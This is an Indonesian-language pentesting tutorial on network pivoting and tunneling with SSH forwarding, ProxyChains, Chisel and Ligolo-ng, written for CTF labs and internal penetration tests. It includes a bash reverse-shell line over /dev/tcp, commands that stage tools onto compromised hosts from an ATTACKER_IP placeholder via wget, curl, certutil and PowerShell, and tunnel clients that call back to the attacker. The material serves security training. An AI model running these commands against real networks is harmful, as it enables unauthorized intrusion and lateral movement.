---
id: "64"
title: "⚡ Quick Start: Urutan Kerja Pivoting (Untuk Pemula)"
category: "9. OSINT & Misc"
categoryId: "osint_misc"
filename: "64_pivoting_tunneling_workflow.md"
refs_out: ["01","05","06","15","35","42","57","63"]
refs_in: ["06","10","12","20","21","23","24","26","44","46","47","50"]
---

> **Target Environment:** Parrot OS XFCE (Debian-based)  
> **Prerequisites:** Memahami Linux CLI dasar, manajemen proses, networking dasar (CIDR, Subnet, Routing), dan reverse shell handling (referensi: [01. Mindset, Metodologi, dan Workflow Pentesting — Panduan Fundamental](/docs/mindset-dan-metodologi), [🏛️ Bagian 0: Fondasi PCAP Analysis](/docs/pcap-analysis)).  
> **Fokus Utama:** Menembus batas isolasi jaringan, perutean multi-subnet, lateral movement, dan pengalihan port (_port forwarding_) menggunakan SSH, Chisel, Ligolo-ng, Socat, dan ProxyChains pada CTF (HackTheBox, TryHackMe) dan uji penetrasi internal nyata.

---

## 📑 Daftar Isi

1. [Bagian 0: Fondasi Pivoting & Network Tunneling](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-0-fondasi-pivoting)
2. [Bagian 1: Setup Environment & Tooling di Parrot OS](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-1-setup-environment--tooling)
3. [Bagian 2: SSH Port Forwarding (Local, Remote, Dynamic)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-2-ssh-port-forwarding)
4. [Bagian 3: ProxyChains & SOCKS Proxy Management](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-3-proxychains--socks-proxy-management)
5. [Bagian 4: Chisel HTTP/WebSockets Tunneling](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-4-chisel-httpwebsockets-tunneling)
6. [Bagian 5: Ligolo-ng (Modern Layer 3 VPN-Like Pivoting)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-5-ligolo-ng-modern-layer-3-pivoting)
7. [Bagian 6: Netcat & Socat Relay Tunneling](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-6-netcat--socat-relay-tunneling)
8. [Bagian 7: 3 Skenario Pivoting End-to-End](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-7-3-skenario-pivoting-end-to-end)
9. [Bagian 8: Integrasi Tooling Melalui Proxy (Nmap, Burp, Metasploit)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-8-integrasi-tooling-melalui-proxy)
10. [Bagian 9: Command Reference & Quick Synthesis](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-9-command-reference--quick-synthesis)
11. [Bagian 10: Master Pivoting Decision Tree](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-10-master-pivoting-decision-tree)
12. [Bagian 11: Troubleshooting & Common Pitfalls](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-11-troubleshooting--common-pitfalls)
13. [Bagian 12: Cheatsheet Copy-Paste Ready](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-12-cheatsheet-copy-paste-ready)

---

## ⚡ Quick Start: Urutan Kerja Pivoting (Untuk Pemula)

[ ] 1. **Deteksi Dual-NIC pada Foothold Shell:**
       `ip addr show` atau `route -n` atau `cat /proc/net/arp`

[ ] 2. **Pilih Metode Pivoting Sesuai Hak Akses & Firewall:**
       - Punya root di Attacker? → **Ligolo-ng** (Layer 3 VPN-like, bisa `nmap -sS`)
       - SSH aktif & punya kredensial? → **SSH Dynamic SOCKS (`ssh -D 1080`)**
       - Hanya punya WebShell / Egress Restricted? → **Chisel (`chisel client R:socks`)**

[ ] 3. **Format File Transfer ke Pivot Host:**
       Gunakan Python HTTP Server + `wget` / `curl` / `certutil` / `iwr`

[ ] 4. **Host Discovery di Subnet Internal:**
       Bash Ping Sweep atau TCP Port Probe (`timeout 1 bash -c "echo > /dev/tcp/IP/22"`)

[ ] 5. **Jalankan Recon & Attack via Proxy/Route:**
       - Jika pakai SOCKS (ProxyChains): `proxychains4 nmap -sT -Pn -n -p 22,80,445 IP`
       - Jika pakai Ligolo-ng: `nmap -sS -Pn -p 22,80,445 IP` (Langsung tanpa ProxyChains!)

[ ] 6. **Teardown & Cleanup Setelah Selesai:**
       Hapus route (`ip route del`), matikan TUN interface, dan bunuh proses tunnel (`pkill -f chisel`).

---

## 🌐 Bagian 0: Fondasi Pivoting

### 0.1 Apa Itu Pivoting dan Mengapa Dibutuhkan?

Dalam uji penetrasi enterprise atau mesin CTF bertipe multi-tier (misalnya HackTheBox Pro Labs, Wrecker, Dante, Zephyr), mesin target utama (_Domain Controller_, database keuangan, atau server internal) **tidak pernah terhubung langsung ke internet publik**.

> **Analogi Operasional:**  
> Anda ingin masuk ke ruangan brankas di lantai basement sebuah gedung perkantoran, namun pintu lift publik menuju basement dikunci total dari luar. Anda berhasil menyusup ke ruang resepsionis di lantai 1 (komputer publik). Dari komputer resepsionis tersebut, ternyata ada tangga darurat privat yang langsung terhubung ke lantai basement.  
> **Pivoting** adalah tindakan menggunakan komputer resepsionis tersebut sebagai "jembatan loncatan" (_jump host_) untuk merutekan seluruh peralatan pengujian Anda langsung ke ruangan brankas di basement.

text

```
       DIAGRAM TOPOLOGI PERUTEAN PIVOTING
 ┌────────────────┐
 │ Workstation    │ (IP: 10.10.14.50 - Parrot OS Penyerang)
 │ Attacker       │
 └───────┬────────┘
         │ Internet / VPN Tunnel
         ▼
 ┌────────────────┐
 │ PIVOT HOST     │ (Dual-NIC Compromised Machine)
 │ (Public Edge)  │ Interface 1 (Publik)   : 10.10.11.100  <── Attacker Bisa Akses
 └───────┬────────┘ Interface 2 (Internal) : 172.16.1.5     <── Terhubung ke Segmen Tertutup
         │
         │ Jaringan Internal Privat (172.16.1.0/24)
         ▼ (Attacker TIDAK BISA akses IP ini secara langsung dari internet)
 ┌────────────────┐
 │ TARGET HOST    │
 │ (Internal Only)│ IP: 172.16.1.20 (Database Server / Active Directory DC)
 └────────────────┘
```

#### Cara Identifikasi: "Apakah Target Adalah Pivot Host (Dual-NIC)?"

Pemula sering tidak menyadari bahwa mesin yang baru dikompromikan terhubung ke subnet internal lain. Jalankan perintah berikut pada shell target:

Bash

```bash
# 1. Cek semua Network Interface (Apakah ada lebih dari 1 NIC aktif?)
ip addr show
ip -brief addr show     # Format ringkas
ifconfig -a

# 2. Cek Routing Table (Apakah ada subnet privat selain IP akses kita?)
ip route
route -n

# 3. Cek ARP Cache (Siapa saja tetangga jaringan internal yang pernah berkomunikasi?)
arp -en
cat /proc/net/arp

# 4. Cek file Hosts (Apakah ada nama host internal?)
cat /etc/hosts

# 5. Cek Koneksi Socket Aktif
ss -tunap || netstat -tunap

# 💡 TANDA PASTI BUTUH PIVOTING:
# - Ada interface eth1, ens33, atau adapter kedua dengan range IP privat berbeda (misal 172.16.1.X / 192.168.X.X).
# - Routing table menunjukkan default gateway atau interface khusus untuk subnet internal.
# - ARP cache mencatat aktivitas IP lain di subnet yang tidak dapat dijangkau dari mesin Attacker.
```

#### Taksonomi Perbedaan Konsep:

- **Pivoting:** Metodologi keseluruhan untuk memanfaatkan sistem yang telah dikompromikan sebagai mediator guna melancarkan serangan ke sistem lain di jaringan internal.
- **Tunneling:** Teknik membungkus (_encapsulating_) protokol jaringan ke dalam muatan protokol lain (contoh: membungkus seluruh traffic TCP sembarang ke dalam stream SSH atau HTTP POST request) untuk menembus aturan firewall atau NAT.
- **Port Forwarding:** Tindakan memetakan (_mapping_) alamat IP dan nomor port spesifik dari suatu mesin ke port lain pada mesin yang berbeda (pengalihan jalur titik-ke-titik).

---

### 0.2 Terminologi Kunci

- **Pivot Host / Jump Host:** Mesin yang telah berhasil dieksploitasi (_foothold_) yang memiliki minimal dua network interface (multihomed) dan bertindak sebagai gerbang perantara.
- **SOCKS Proxy (SOCKS4/SOCKS5):** Protokol proxy serbaguna layer 5 yang merutekan paket TCP (dan UDP pada SOCKS5) dari program klien menuju target akhir melalui server proxy tanpa perlu mengetahui isi protokol aplikasi.
- **ProxyChains:** Program utilitas Linux berbasis library hook (`LD_PRELOAD`) yang memaksa program berbasis jaringan dinamis (seperti Nmap, cURL, Metasploit) untuk mengalirkan paketnya melewati satu atau serangkaian SOCKS/HTTP proxy.
- **Local Port Forwarding (`-L`):** Membuka port listening di mesin **LOKAL (Attacker)**, di mana setiap koneksi yang masuk akan diteruskan melalui tunnel ke port pada mesin target remote.
- **Remote Port Forwarding (`-R`):** Membuka port listening di mesin **REMOTE (Pivot/Target)**, di mana setiap koneksi yang masuk akan diteruskan kembali ke port di mesin lokal penyerang (krusial untuk menerima reverse shell menembus firewall).
- **Dynamic Port Forwarding (`-D`):** Mengubah koneksi SSH menjadi sebuah SOCKS proxy lokal dinamis tanpa perlu menentukan port tujuan tertentu secara kaku.
- **Reverse Shell vs Bind Shell:** Reverse shell mengarahkan target untuk menghubungi keluar (_outbound_) menuju penyerang; bind shell membuka port mendengarkan di mesin target dan menunggu penyerang menghubungi masuk (_inbound_).

---

### 0.3 3 Skenario Pivoting Umum

#### Skenario 1: Single Pivot (Standard Dual-NIC)

Attacker menguasai web server eksternal, lalu memanfaatkan web server tersebut untuk menjangkau subnet database internal yang terisolasi.

text

```
[Attacker: 10.10.14.X] ──► [Pivot: 10.10.11.X | 172.16.1.5] ──► [Internal Target: 172.16.1.20]
```

#### Skenario 2: Double Pivot (Multi-Tier Segmented Network)

Attacker harus melewati dua lapis mesin lompatan untuk menjangkau segmen terisolasi (contoh: DMZ →→ Internal Workstations →→ Secure Domain Controller Network).

text

```
[Attacker] ──► [Pivot 1 (DMZ)] ──► [Pivot 2 (Internal)] ──► [Isolated DC: 192.168.100.5]
```

#### Skenario 3: Reverse Pivot (Inbound Firewalled Network)

Firewall memblokir seluruh koneksi masuk (_inbound_) ke pivot host, namun mengizinkan koneksi keluar (_outbound_) pada port web/DNS standar. Penyerang mengarahkan pivot host untuk membentuk tunnel ke luar menuju mesin penyerang.

text

```
[Pivot Host (Victim)] ──► (Keluar via HTTP/HTTPS/SSH) ──► [Attacker Listener (Parrot OS)]
         ▲
         └───────────── (Tunnel Balik Digunakan untuk Menembus Jaringan Internal)
```

---

## 🛠️ Bagian 1: Setup Environment & Tooling

### 1.1 Verifikasi Tool Pre-Installed di Parrot OS

Parrot OS Security Edition sudah menyertakan paket utama berikut secara native:

Bash

```
# Verifikasi ketersediaan binary utama
which ssh netcat socat proxychains4
```

---

### 1.2 Instalasi Chisel & Ligolo-ng

Eksekusi perintah berikut untuk memasang versi binary terkini dari **Chisel** dan **Ligolo-ng** ke sistem Parrot OS:

Bash

```
# 1. Update package database
sudo apt update -y && sudo apt install -y jq curl tar gzip

# 2. Instalasi Chisel (HTTP/WebSockets TCP/UDP Tunnel)
CHISEL_VER=$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | jq -r '.tag_name')
echo "[*] Mengunduh Chisel versi: ${CHISEL_VER}"
wget "https://github.com/jpillora/chisel/releases/download/${CHISEL_VER}/chisel_${CHISEL_VER#v}_linux_amd64.gz" -O /tmp/chisel.gz
gunzip -f /tmp/chisel.gz
chmod +x /tmp/chisel
sudo mv /tmp/chisel /usr/local/bin/chisel
chisel --version

# 3. Instalasi Ligolo-ng (Proxy Controller di Attacker Machine)
LIGOLO_VER="v0.6.2"
echo "[*] Mengunduh Ligolo-ng Proxy versi: ${LIGOLO_VER}"
wget "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_proxy_${LIGOLO_VER#v}_linux_amd64.tar.gz" -O /tmp/ligolo-proxy.tar.gz
sudo tar -xzf /tmp/ligolo-proxy.tar.gz -C /usr/local/bin/ proxy
sudo chmod +x /usr/local/bin/proxy
sudo mv /usr/local/bin/proxy /usr/local/bin/ligolo-proxy
rm /tmp/ligolo-proxy.tar.gz

# 4. Unduh Ligolo-ng Agent (Untuk ditransfer ke Pivot Host Linux & Windows)
mkdir -p ~/pivoting/payloads
cd ~/pivoting/payloads
wget "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER#v}_linux_amd64.tar.gz" -O agent_linux.tar.gz
tar -xzf agent_linux.tar.gz agent && mv agent agent_linux && rm agent_linux.tar.gz

wget "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER#v}_windows_amd64.zip" -O agent_win.zip
unzip -q agent_win.zip agent.exe && mv agent.exe agent_windows.exe && rm agent_win.zip
ls -la ~/pivoting/payloads/
```

---

### 1.3 Setup Workspace & Environment Variables

Gunakan konfigurasi variabel sesi berikut untuk memudahkan reproduksi instruksi di seluruh modul:

Bash

```
# Tambahkan ke terminal aktif atau simpan di ~/.bashrc
export ATTACKER_IP="10.10.14.50"   # Alamat IP antarmuka tun0 (VPN CTF)
export PIVOT_IP="10.10.11.100"      # Alamat IP publik pivot host yang dapat dijangkau
export TARGET_IP="172.16.1.20"     # Alamat IP target internal yang terisolasi

# Struktur direktori operasional
mkdir -p ~/pivoting/{ssh,chisel,ligolo,loot}
```

#### Matriks Transfer File Payload ke Pivot Host

Ketika alat seperti `chisel` atau `agent_linux` perlu dikirim ke pivot host:

|Kondisi Pivot Host|Metode Transfer|Perintah Eksekusi|
|---|---|---|
|**Linux (Ada `wget`)**|Python HTTP Server|`wget http://ATTACKER_IP:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel`|
|**Linux (Ada `curl`)**|Python HTTP Server|`curl -o /tmp/chisel http://ATTACKER_IP:8080/chisel && chmod +x /tmp/chisel`|
|**Linux (Ada SSH / SCP)**|SCP Langsung|`scp ~/pivoting/payloads/agent_linux user@PIVOT_IP:/tmp/agent_linux`|
|**Linux / Windows (Ada Netcat)**|Netcat Binary Transfer|*Pivot:* `nc -lvnp 9999 > chisel`<br>*Attacker:* `nc -w 3 PIVOT_IP 9999 < chisel`|
|**Windows (PowerShell)**|Invoke-WebRequest|`iwr http://ATTACKER_IP:8080/agent_windows.exe -OutFile "$env:TEMP\agent.exe"`|
|**Windows (Certutil)**|Certutil URLCache|`certutil -urlcache -split -f http://ATTACKER_IP:8080/chisel.exe %TEMP%\chisel.exe`|

---

## 🔑 Bagian 2: SSH Port Forwarding

SSH merupakan mekanisme tunneling bawaan sistem operasi paling stabil jika Anda telah memperoleh kredensial valid (password atau private key `id_rsa`) pada pivot host.

text

```
                  TAKSONOMI PARAMETER FORWARDING SSH
 ┌───────────────┬────────────────────────────────────────────────────────┐
 │ Flag          │ Arah & Operasi                                         │
 ├───────────────┼────────────────────────────────────────────────────────┤
 │ -L (Local)    │ Buka port di Attacker ──► Teruskan ke Target Internal   │
 │ -R (Remote)   │ Buka port di Pivot    ──► Teruskan ke Attacker Lokal   │
 │ -D (Dynamic)  │ Buka SOCKS Proxy lokal──► Akses Seluruh Range Subnet   │
 └───────────────┴────────────────────────────────────────────────────────┘
```

---

### 2.1 Local Port Forwarding (`-L`)

Gunakan `-L` saat Anda ingin mengakses **port spesifik** pada mesin internal (contoh: service database internal port 3306, web admin panel port 80/8080, atau SMB port 445) seolah-olah service tersebut berjalan langsung di mesin Parrot OS Anda.

Sintaks: ssh -L [LOCAL_IP:]LOCAL_PORT:DESTINATION_IP:DESTINATION_PORT user@PIVOT_HOSTSintaks: ssh -L [LOCAL_IP:]LOCAL_PORT:DESTINATION_IP:DESTINATION_PORT user@PIVOT_HOST

Bash

```
# 1. Forward Web Server Internal (172.16.1.20:80) ke Port 8080 Lokal Attacker (Password SSH)
ssh -L 8080:172.16.1.20:80 user@10.10.11.100 -N -f

# 2. Forward Database MySQL Internal (172.16.1.20:3306) Menggunakan SSH Private Key (id_rsa)
chmod 600 ~/pivoting/ssh/id_rsa
ssh -L 3306:172.16.1.20:3306 -i ~/pivoting/ssh/id_rsa user@10.10.11.100 -N -f

# 3. Dynamic SOCKS5 Proxy Menggunakan SSH Key (id_rsa)
ssh -D 1080 -i ~/pivoting/ssh/id_rsa user@10.10.11.100 -N -f

# 4. Multiple Port Forwarding Sekaligus dalam Satu Perintah
ssh -L 8080:172.16.1.20:80 \
    -L 8443:172.16.1.20:443 \
    -L 3306:172.16.1.25:3306 \
    -i ~/pivoting/ssh/id_rsa \
    user@10.10.11.100 -N -f

# Verifikasi port listening lokal telah terbuka di Parrot OS:
ss -tlnp | grep -E "8080|3306"
```

text

```
       ALUR KOMUNIKASI LOCAL PORT FORWARDING (-L)
 [ Parrot OS Attacker ]                          [ Pivot Host ]               [ Target Internal ]
 (Browser: localhost:8080) ──► Enkapsulasi SSH ──► (10.10.11.100) ──► Raw TCP ──► (172.16.1.20:80)
```

_Cara Mengakses Service Setelah Forwarding Berjalan:_

Bash

```
# Akses web internal via curl lokal
curl -I http://127.0.0.1:8080

# Akses database MySQL via client lokal
mysql -h 127.0.0.1 -P 3306 -u root -p
```

---

### 2.2 Remote Port Forwarding (`-R`)

Gunakan `-R` saat mesin internal di balik pivot host ingin Anda berikan akses menuju port tertentu di mesin penyerang. Vektor paling umum: **Menerima Reverse Shell dari mesin internal**. Mesin internal tidak bisa menghubungi `10.10.14.50` secara langsung, tetapi mesin internal bisa menghubungi Pivot Host pada port yang sudah di-forward balik.

Sintaks: ssh -R [REMOTE_IP:]REMOTE_PORT:LOCAL_DESTINATION_IP:LOCAL_PORT user@PIVOT_HOSTSintaks: ssh -R [REMOTE_IP:]REMOTE_PORT:LOCAL_DESTINATION_IP:LOCAL_PORT user@PIVOT_HOST

Bash

```
# 1. Buka port 9001 di Pivot Host yang akan diteruskan ke listener lokal port 4444 di Parrot OS
ssh -R 9001:127.0.0.1:4444 user@10.10.11.100 -N -f

# 2. Pasang Netcat Listener di Parrot OS
nc -lvnp 4444
```

text

```
       ALUR KOMUNIKASI REMOTE PORT FORWARDING (-R)
 [ Target Internal ]                     [ Pivot Host ]                      [ Parrot OS Attacker ]
 Trigger Reverse Shell ke ──► Masuk ke port 9001 ──► Diteruskan via SSH ──► Masuk ke Listener:
 (172.16.1.5:9001)            (Terekspos di Pivot)                            (127.0.0.1:4444)
```

_Trigger Reverse Shell dari Target Internal:_

Bash

```
# Di mesin 172.16.1.20 (Target Internal), arahkan shell ke Pivot Host IP pada port 9001:
bash -i >& /dev/tcp/172.16.1.5/9001 0>&1
```

---

### 2.3 Dynamic Port Forwarding (`-D` SOCKS Proxy)

Jika Anda belum mengetahui port apa saja yang terbuka di segmen internal dan ingin melakukan scanning luas atau menjalankan tools yang dinamis, jangan gunakan `-L`. Gunakan `-D` untuk membuat tunnel bertindak sebagai **SOCKS4/SOCKS5 Proxy**.

Sintaks: ssh -D LOCAL_SOCKS_PORT user@PIVOT_HOST -N -fSintaks: ssh -D LOCAL_SOCKS_PORT user@PIVOT_HOST -N -f

Bash

```
# 1. Bangun SOCKS5 proxy lokal pada port 1080 melalui Pivot Host
ssh -D 1080 user@10.10.11.100 -N -f -o StrictHostKeyChecking=no

# 2. Verifikasi socket SOCKS aktif mendengarkan pada localhost
ss -tlnp | grep 1080
# Output: LISTEN 0 128 127.0.0.1:1080 0.0.0.0:* users:(("ssh",pid=14230,fd=5))
```

---

### 2.4 Opsi CLI SSH Wajib untuk Automasi Pivoting

Gunakan kombinasi flag berikut agar sesi SSH tunnel Anda tidak mengunci terminal, tidak meminta konfirmasi fingerprint baru, dan tidak terputus di tengah jalan (_idle timeout_):

Bash

```
ssh -D 1080 \
    -f \                                 # Mendorong proses SSH ke background (fork)
    -N \                                 # Jangan eksekusi perintah shell interaktif (hanya forward)
    -q \                                 # Quiet mode (reduksi banner output)
    -o StrictHostKeyChecking=no \        # Otomatis terima host key baru tanpa konfirmasi interaktif
    -o UserKnownHostsFile=/dev/null \    # Jangan kotori ~/.ssh/known_hosts dengan IP sementara CTF
    -o ServerAliveInterval=60 \          # Kirim ping keepalive setiap 60 detik agar koneksi tidak drop
    user@10.10.11.100
```

_Cara Menghentikan SSH Tunnel di Background:_

Bash

```
# Cari PID proses SSH tunnel yang sedang berjalan
ps aux | grep "ssh -[L,R,D]"
# Bunuh proses berdasarkan port spesifik
kill -9 $(pgrep -f "ssh -D 1080")
```

---

## 🔀 Bagian 3: ProxyChains & SOCKS Proxy Management

### 3.1 Konfigurasi `/etc/proxychains4.conf`

ProxyChains bekerja dengan mencegat pemanggilan fungsi socket libc sistem (`connect()`) dan mengalihkannya ke SOCKS proxy yang didefinisikan.

Bash

```
# Buka file konfigurasi utama
sudo nano /etc/proxychains4.conf
```

Lakukan penyesuaian parameter berikut:

ini

```
# 1. Pilih Chain Mode (Gunakan dynamic_chain untuk stabilitas)
dynamic_chain
# strict_chain  <-- Berikan tanda komentar (#) pada strict_chain
# random_chain  <-- Pastikan tidak aktif

# 2. Hindari kebocoran resolusi nama domain (DNS Leak)
proxy_dns

# 3. Konfigurasi Timeout
tcp_read_time_out 15000
tcp_connect_time_out 8000

# 4. Bagian [ProxyList] di baris paling bawah file:
[ProxyList]
# Format: <tipe_proxy> <ip_proxy> <port_proxy> [user] [pass]
socks5  127.0.0.1  1080
```

#### Perbedaan Mode ProxyChains:

- `strict_chain`: Seluruh proxy dalam list wajib hidup sesuai urutan statis. Jika satu proxy mati, seluruh koneksi gagal.
- `dynamic_chain`: Proxy dilewati sesuai urutan, namun jika salah satu proxy mati, ProxyChains otomatis melompatinya tanpa menghentikan koneksi. **(Rekomendasi Utama Pentester)**.

---

### 3.2 Aturan Operasional Penting: Nmap via ProxyChains

> **PERINGATAN KRITIKAL: Batasan Raw Socket SOCKS**  
> Protokol SOCKS berjalan di Application Layer (Layer 5/7). SOCKS **TIDAK MENDUKUNG** manipulasi paket raw IP level rendah.
> 
> - `nmap -sS` (SYN Stealth Scan) **PASTI GAGAL / MEMUNCULKAN ERROR** saat dijalankan melalui ProxyChains.
> - Anda **WAJIB** menggunakan flag `-sT` (Full TCP Connect Scan).
> - Nonaktifkan ICMP Ping check menggunakan flag `-Pn` (karena ICMP tidak bisa melewati SOCKS proxy).

Bash

```
# 1. Port Scan Cepat pada Target Internal Melalui SOCKS Tunnel
proxychains4 nmap -sT -Pn -p 21,22,80,443,445,3389,8080 -n 172.16.1.20

# 2. Scanning Subnet Luas Secara Ringkas (Top Ports)
proxychains4 nmap -sT -Pn --top-ports 20 --open -n 172.16.1.0/24

# 3. Menjalankan Tools Web Testing Melalui Tunnel
proxychains4 curl -s http://172.16.1.20/admin/login.php
proxychains4 dirsearch -u http://172.16.1.20/ -e php,txt,html --proxy socks5://127.0.0.1:1080

# 4. Eksploitasi Database & SMB Melalui Tunnel
proxychains4 netexec smb 172.16.1.20 -u "Administrator" -p "Password123!"
proxychains4 sqlmap -u "http://172.16.1.20/view.php?id=1" --batch --proxy="socks5://127.0.0.1:1080"
```

---

### 3.3 Integrasi Browser (Firefox & FoxyProxy)

Agar dapat meramban web internal target secara nyaman:

1. Buka **Firefox** di Parrot OS.
2. Pasang extension **FoxyProxy Standard**.
3. Tambahkan profil baru:
    - **Proxy Type:** `SOCKS5`
    - **Proxy IP, Hostname, or Domain:** `127.0.0.1`
    - **Port:** `1080`
    - Centang opsi **Send DNS through SOCKS5 proxy** (mencegah DNS request bocor ke ISP lokal).
4. Aktifkan ekstensi ke mode profil tersebut, lalu buka URL internal target di address bar: `http://172.16.1.20/`.

---

## 🚇 Bagian 4: Chisel HTTP/WebSockets Tunneling

Chisel adalah utilitas tunneling TCP/UDP independen yang ditulis dalam bahasa Go. Chisel membungkus seluruh traffic koneksi ke dalam protokol **HTTP/WebSockets**, menjadikannya solusi ideal ketika **SSH dinonaktifkan atau port SSH diblokir egress firewall**, sementara port HTTP/HTTPS diizinkan keluar.

text

```
       ARSITEKTUR OPERASIONAL CHISEL TUNNEL
 [ Parrot OS Attacker ]                                   [ Pivot Host (Victim) ]
 Menjalankan Chisel SERVER                               Menjalankan Chisel CLIENT
 (Mendengarkan di 0.0.0.0:8001) ◄── WebSockets Tunnel ─── (Menghubungi keluar ke 8001)
          │                                                        │
          ▼ Membuka SOCKS5: 127.0.0.1:1080                         ▼ Meneruskan traffic ke
   (Dihubungkan via ProxyChains)                              Jaringan Internal (172.16.1.0/24)
```

---

### 4.1 Menyiapkan Chisel Server di Parrot OS (Attacker)

Jalankan server Chisel di mesin penyerang untuk mendengarkan koneksi balik dari target:

Bash

```
# Menjalankan Chisel server pada port 8001 dengan fitur reverse tunneling aktif
chisel server --port 8001 --reverse -v
```

_Flag `--reverse` adalah parameter wajib yang mengizinkan client mengendalikan pembuatan listening port di sisi server._

---

### 4.2 Menyiapkan Chisel Client di Pivot Host

Kirim binary `chisel` ke pivot host menggunakan Python web server:

Bash

```
# Di Parrot OS (Hosting payload):
cd /usr/local/bin && python3 -m http.server 8080

# Di Pivot Host (Linux):
cd /tmp
wget http://10.10.14.50:8080/chisel && chmod +x chisel

# Di Pivot Host (Windows PowerShell):
# Invoke-WebRequest -Uri "http://10.10.14.50:8080/chisel.exe" -OutFile "$env:TEMP\chisel.exe"
```

#### Skenario A: Membuat Full Reverse SOCKS5 Proxy (Paling Sering Digunakan)

Bash

```
# Di Pivot Host:
./chisel client 10.10.14.50:8001 R:socks &
```

_Output di Terminal Chisel Server Parrot OS:_

text

```
2023/10/18 17:30:12 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening on 127.0.0.1:1080...
```

_Seketika, SOCKS5 proxy aktif di `127.0.0.1:1080` pada mesin Parrot OS Anda. Seluruh traffic via ProxyChains akan dialihkan menembus pivot host ke subnet internal._

#### Skenario B: Reverse Port Forwarding Tunggal

Jika hanya ingin mengekspos satu service internal (misal port 80 internal target) ke port 9090 di Parrot OS:

Bash

```
# Di Pivot Host:
./chisel client 10.10.14.50:8001 R:9090:172.16.1.20:80 &

# Verifikasi di Parrot OS:
curl http://127.0.0.1:9090
```

---

### 4.3 Double Pivoting Menggunakan Chisel Chaining

Ketika target berada di balik lapis kedua (Pivot 1 →→ Pivot 2 →→ Target):

text

```
[Attacker] ◄── Tunnel 1 ──► [Pivot 1] ◄── Tunnel 2 ──► [Pivot 2] ──► [Target]
```

1. **Lapis 1 (Attacker ↔↔ Pivot 1):**
    - Attacker menjalankan Chisel server pada port 8001:
        
        Bash
        
        ```
        chisel server --port 8001 --reverse
        ```
        
    - Pivot 1 menghubungi Attacker dan membuka SOCKS5 lokal di Attacker port 1080:
        
        Bash
        
        ```
        ./chisel client 10.10.14.50:8001 R:1080:socks
        ```
        
2. **Lapis 2 (Pivot 1 ↔↔ Pivot 2):**
    - Pivot 1 menjalankan Chisel server internal pada port 8002:
        
        Bash
        
        ```
        ./chisel server --port 8002 --reverse &
        ```
        
    - Pivot 2 menghubungi Pivot 1 dan mengalihkan SOCKS ke Pivot 1 port 1081:
        
        Bash
        
        ```
        ./chisel client 172.16.1.5:8002 R:1081:socks
        ```
        
    - Forward port 1081 di Pivot 1 kembali ke Attacker port 1081 melalui ProxyChains / SSH.
    - Konfigurasi `/etc/proxychains4.conf` menjadi multi-hop chain:
        
        ini
        
        ```
        dynamic_chain
        [ProxyList]
        socks5 127.0.0.1 1080
        socks5 127.0.0.1 1081
        ```
        

---

## ⚡ Bagian 5: Ligolo-ng (Modern Layer 3 Pivoting)

**Ligolo-ng** adalah standar modern emas dalam perutean jaringan pentest. Tidak seperti SOCKS proxy yang bekerja di Layer 5 dan lambat, Ligolo-ng membuat **Virtual Network TUN Interface** langsung di OS Parrot Anda.

### Mengapa Ligolo-ng Jauh Lebih Unggul dari Chisel & SSH?

1. **Bebas ProxyChains:** Anda tidak perlu mengetikkan `proxychains4` sebelum perintah.
2. **Mendukung Nmap Raw Scanning:** Anda dapat menjalankan **SYN Scan (`nmap -sS`)**, OS Detection (`-O`), dan UDP scan secara native.
3. **Kecepatan Transfer Maksimal:** Latensi jauh lebih rendah untuk mentransfer biner besar atau scanning massal.
4. **Routing Bersifat Sistemik:** Semua aplikasi GUI dan CLI di Parrot OS langsung mengenali IP subnet internal secara transparan.

text

```
       ARSITEKTUR LAYER 3 TUNNELING LIGOLO-NG
 ┌────────────────────────────────────────────────────────┐
 │ PARROT OS ATTACKER                                     │
 │ [Kernel Routing Table] ──► dev ligolo (TUN Interface)  │
 │   172.16.1.0/24                                        │
 └───────────────────────────┬────────────────────────────┘
                             │ TLS Encrypted Tunnel (Port 11601)
                             ▼
 ┌────────────────────────────────────────────────────────┐
 │ PIVOT HOST (Linux / Windows)                           │
 │ Menjalankan: ./agent -connect 10.10.14.50:11601        │
 └───────────────────────────┬────────────────────────────┘
                             │ Native Raw Packet Injection
                             ▼
 ┌────────────────────────────────────────────────────────┐
 │ TARGET INTERNAL SUBNET (172.16.1.0/24)                 │
 └────────────────────────────────────────────────────────┘
```

---

### 5.1 Setup Controller & TUN Interface di Parrot OS (Attacker)

Jalankan konfigurasi interface virtual satu kali di workstation Parrot OS Anda:

Bash

```
# 1. Buat interface TUN baru bernama 'ligolo' yang dimiliki oleh user aktif Anda
sudo ip tuntap add user $USER mode tun ligolo

# 2. Aktifkan status link interface
sudo ip link set ligolo up

# 3. Verifikasi ketersediaan interface
ip link show ligolo

# 4. Jalankan Ligolo-ng Proxy Controller (Gunakan self-signed cert otomatis)
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```

---

### 5.2 Menjalankan Agent di Pivot Host

Transfer file binary agent (`agent_linux` atau `agent_windows.exe`) yang telah disiapkan di Bagian 1.2 menuju Pivot Host:

Bash

```
# Di Pivot Host (Linux):
chmod +x agent_linux
./agent_linux -connect 10.10.14.50:11601 -ignore-cert &

# Di Pivot Host (Windows):
# .\agent_windows.exe -connect 10.10.14.50:11601 -ignore-cert
```

---

